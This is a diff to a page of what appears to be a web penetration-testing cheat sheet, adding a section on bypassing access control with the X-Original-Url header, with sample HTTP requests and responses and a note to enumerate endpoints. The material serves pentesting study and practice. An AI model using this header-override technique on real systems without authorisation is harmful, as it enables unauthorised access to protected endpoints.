@@ -65,7 +65,7 @@ Using FFUF, you just need to change the _number value as the parameter to FUZZ.
 </details>
 <details>
 <summary>PARAMETERS PROVIDING ACCESS</summary>
-<p><b>DESCRIPTION: </b> Some tokens, parameters could change the behavior of the application regarding what can be accessed. 
+<b>DESCRIPTION: </b> Some tokens, parameters could change the behavior of the application regarding what can be accessed. 
 
 0. Manual inspection is needed. [burpsuite / dev-tools]	
 1. Check if exist any cookie, token, etc. that is providing autorization/access ? TRUE / FALSE
@@ -78,8 +78,70 @@ Using FFUF, you just need to change the _number value as the parameter to FUZZ.
 
 <b>SAMPLE:</b> GET /my-account?id=carlos 
 	
-</p>
 </details>
+<details>
+<summary>URL-BASED [X-Original-Url] Header</summary>
+<b>DESCRIPTION:</b> 
+
+<b>NOTES:</b>
+
+1. Inspect requests using burpsuite.
+2. Check if activity is client or server-side ? [dev-tools browser]
+	
+<u>How to test if backend is using the <b>X-Original-URL</b> header as part of the action ?</u>
+
+<mark><b>SAMPLE REQUEST:</b></mark>
+
+<b>REQUEST</b>	
+GET /vuln_endpoint HTTP/2
+Host: machetevault.com
+Cookie: session=I9glIXHonYMJpBHmvZFelIaiS
+<b>RESPONSE</b>
+HTTP/2 403 Forbidden
+Content-Type: application/json; charset=utf-8
+X-Frame-Options: SAMEORIGIN
+Content-Length: 15
+
+"Access denied"
+
+Previous sample can help to understand how to test it, two steps:
+
+1. Change request URL to only "<b>/</b>".
+2. <b>C1.</b> Add header <mark id="BAC01"><b>X-Original-Url: /null</b></mark>
+3. URL and header can merge data. However, X-Original-Url header does not accept parameters.
+
+<button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#BAC01')">.C1.</button> 
+	
+<b>RESPONSE</b>
+HTTP/2 404 Not Found
+Content-Type: application/json; charset=utf-8
+X-Frame-Options: SAMEORIGIN
+Content-Length: 11
+
+"Not Found"
+
+First response, we got "<b>Access denied</b>" meaning the <u>vuln_endpoint</u> was not allowed. However, after adding 
+the header "X-Original-Url" you can manually set the endpoint/URL to try, it will overwrite the URL to use. Second response, 
+we got "Not Found". So, it means that possible the backend is processing the URL using this header as it is changing 
+behavior/response.
+
+Enumerate possible endpoints and try it.
+	
+</details>
+<details>
+<summary>PROTOCOL HTTP BROKEN ACCESS </summary>
+
+
+
+	
+
+</details>
+	
+
+
+
+
+	
 </div>
 </pre>
 <button onclick="document.location='/machete/offensive/web_penetration_testing/server_side_attacks.html'">GO BACK</button>
